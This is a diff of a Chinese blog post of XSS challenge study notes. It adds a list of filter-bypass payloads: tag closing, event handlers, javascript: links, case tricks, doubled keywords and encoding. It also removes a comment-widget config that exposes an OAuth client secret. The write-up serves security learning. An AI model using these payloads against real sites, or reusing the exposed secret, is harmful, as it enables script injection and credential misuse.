@@ -47,7 +47,7 @@
 <meta property="og:image" content="http://yoursite.com/picture/136.png">
 <meta property="og:image" content="http://yoursite.com/picture/133.png">
 <meta property="og:image" content="http://yoursite.com/picture/134.png">
-<meta property="og:updated_time" content="2019-06-11T11:22:16.963Z">
+<meta property="og:updated_time" content="2019-07-14T14:57:19.934Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss挑战之旅学习笔记">
 <meta name="twitter:description" content="前言：前几天学了xss攻击，觉得有必要写一篇博客记录一下。 题目链接： http://test.xss.tv">
@@ -303,6 +303,24 @@
 <p><img src="/picture/134.png"></p>
 <p>然后触发点击事件就可以了</p>
 <p>后面的就先不打了，等后面有时间再打。</p>
+<p><strong>总结：</strong></p>
+<p>一般的绕过方法：</p>
+<p>1、标签</p>
+<p>闭合标签</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>标签绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;onclick=&apos;javascript:alert(1)&apos;&apos;</span><br><span class="line">&lt;a href=&apos;javascript:alert(1)&apos;&gt;点这里&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<p>2、大小写绕过</p>
+<pre><code>&lt;a hrEf=&apos;javascript:alert(1)&apos;&gt;点这&lt;/a&gt;
+</code></pre><p>3、双写绕过</p>
+<pre><code>&lt;a hrhrefef=&apos;javascrscriptipt:alert(1)&apos;&gt;点这&lt;/a&gt;
+</code></pre><p>4、编码绕过</p>
+<pre><code>十六进制编码
+jsfuck编码
+url编码
+unicode编码
+</code></pre><p>5、burpsuite抓包，通过修改http请求头，伪造cookie等绕过</p>
 
       
 
@@ -471,25 +489,19 @@
   
 
   
-
-  
-
-  
-  <div id="gitment-ctn"></div> 
-<link rel="stylesheet" href="https://jjeejj.github.io/css/gitment.css">
-<script src="https://www.wenjunjiang.win/js/gitment.js"></script>
-<script>
-var gitment = new Gitment({
-  id: "http://yoursite.com/2019/06/11/xss挑战之旅学习笔记/",
-  owner: 'obsetear',
-  repo: 'obsetear.github.io',
-  oauth: {
-    client_id: '4adf5aea4e0d3391e923',
-    client_secret: 'd7ddd2640762a8790db759e138b0e80b44f16c62',
-  },
-})
-gitment.render('gitment-ctn')
+  <div id="SOHUCS" sid="xss挑战之旅学习笔记"></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js"></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "cyukKPcCj",
+        conf: "c4c7f3f8ef05a400e6aac68d354dda11"
+    });
 </script>
+
+  
+
+  
+
   
 
 
@@ -596,11 +608,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">HTML</a>
+                <a href="javascript:void(0)" class="js-tag color3">总结</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">总结</a>
+                <a href="javascript:void(0)" class="js-tag color5">HTML</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -616,19 +628,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">css</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
